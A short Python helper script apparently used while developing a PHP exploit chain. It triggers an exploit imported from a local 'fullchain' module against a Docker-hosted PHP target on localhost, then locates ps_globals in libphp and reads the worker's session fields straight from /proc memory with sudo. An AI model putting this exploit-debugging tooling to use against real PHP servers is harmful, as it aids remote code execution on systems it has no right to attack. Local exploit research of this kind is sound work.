#!/usr/bin/env python3
"""psid.py <container> <port> - print PS(id) in the worker after a trigger."""
import json
import re
import struct
import subprocess
import os
import sys
import time

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import fullchain as F

cont, port = sys.argv[1], int(sys.argv[2])
so = "/tmp/farm-%s.so" % cont.split("-")[-1]


def sh(cmd):
    return subprocess.run(cmd, capture_output=True, text=True).stdout


def pids():
    main = int(sh(["docker", "inspect", "-f", "{{.State.Pid}}", cont]).strip())
    return main, sh(["pgrep", "-P", str(main)]).split()


def psglob(sofile, child):
    vma = None
    for line in sh(["readelf", "-sW", sofile]).splitlines():
        p = line.split()
        if len(p) >= 8 and p[-1] == "ps_globals":
            vma = int(p[1], 16)
            break
    if vma is None:
        return None
    base = None
    for line in open("/proc/%d/maps" % int(child)).read().splitlines():
        if "libphp" in line and " r--p " in line:
            base = int(line.split("-")[0], 16)
            break
    if base is None:
        return None
    return base + vma


def rd(child, addr, n):
    return subprocess.run(
        ["sudo", "dd", "if=/proc/%s/mem" % child, "bs=1", "skip=%d" % addr,
         "count=%d" % n, "iflag=skip_bytes,count_bytes"], capture_output=True).stdout


t = F.Target("127.0.0.1", port, path="/index.php", timeout=60)
ex = F.Exploit(t, b"id", 0, 0, 0, True)
main, kids = pids()
print("child before:", kids)
ex._trigger()
time.sleep(1.0)
main2, kids2 = pids()
child = (kids2 or kids)[0]
g = psglob(so, child)
print("child after:", kids2, "ps_globals:", hex(g) if g else "?")
if g:
    for off, label in ((0x0, "save_path"), (0x8, "name"), (0x10, "id")):
        v = rd(child, g + off, 8)
        if len(v) == 8:
            p = struct.unpack("<Q", v)[0]
            txt = rd(child, p, 24) if 0x1000 < p < 0x7FFFFFFFFFFF else b""
            print("  %-9s = %#x %r" % (label, p, txt[:24]))
